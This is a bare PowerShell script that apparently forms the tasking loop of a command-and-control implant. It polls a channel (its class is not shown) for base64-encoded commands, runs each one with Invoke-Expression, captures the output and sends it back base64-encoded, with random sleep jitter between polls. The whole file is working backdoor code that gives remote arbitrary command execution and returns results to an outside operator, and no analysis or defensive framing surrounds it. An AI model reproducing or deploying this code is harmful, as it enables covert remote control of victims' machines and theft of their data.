$channel = [Channel]::new()
$channel.Initialization()

while ($true) {
    $data = $channel.Get_Task()
    if ($data) {
        $taskarray = $data -split ':'
        $task = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($taskarray[1]))
        $output = & {
            $null = [Console]::Out.WriteLine($task)
            [Text.StringBuilder] $sb = New-Object Text.StringBuilder
            $sw = New-Object IO.StringWriter($sb)
            [Console]::SetOut($sw)
            Invoke-Expression $task
            $sw.ToString()
        }
        if (!$output) {
            $output = 'Output returned Null'
        }
        $output = [Text.Encoding]::UTF8.GetBytes($output)
        $outputid = $taskarray[0] + ":" + [Convert]::ToBase64String($output)
        $channel.Task_IO($outputid)
    }
    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10)
}
